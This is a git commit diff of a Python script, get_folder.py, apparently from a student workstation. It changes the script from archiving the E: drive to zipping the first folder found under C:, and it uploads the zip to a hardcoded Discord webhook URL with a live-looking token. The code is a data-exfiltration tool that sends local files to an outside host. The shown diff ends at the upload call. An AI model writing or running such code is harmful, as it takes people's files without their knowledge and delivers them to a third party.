4875cfd7e1f162d5f48d143a15a065f8949bedaf
unknown <Student@SIOP0202-EDU-06.EPTM.lan>
2025-08-29 10:27:09 +0200

    Change in get_folder.py

--- python/get_folder.py
+++ python/get_folder.py
@@ -4,11 +4,16 @@ import os
 
 WEBHOOK_URL = "https://discordapp.com/api/webhooks/1410619274720055317/-V4w7U5MKF7ggn6xFGrDZfFm4JYzdhQ0wywW7EKzzVS22a2FbCXqI6rXMtj-kjhHM54C"
 
-drive_path = r"E:\"
+drive_root = "C:\\"
+folders = [f for f in os.listdir(drive_root) if os.path.isdir(os.path.join(drive_root, f))]
+if not folders:
+    print("Aucun dossier trouvé dans E:\\")
+    exit(1)
+first_folder = os.path.join(drive_root, folders[0])
 
 zip_path = os.path.join(os.getenv("TEMP"), "folder.zip")
 
-shutil.make_archive(zip_path.replace(".zip", ""), 'zip', drive_path)
+shutil.make_archive(zip_path.replace(".zip", ""), 'zip', first_folder)
 
 with open(zip_path, "rb") as f:
     response = requests.post(
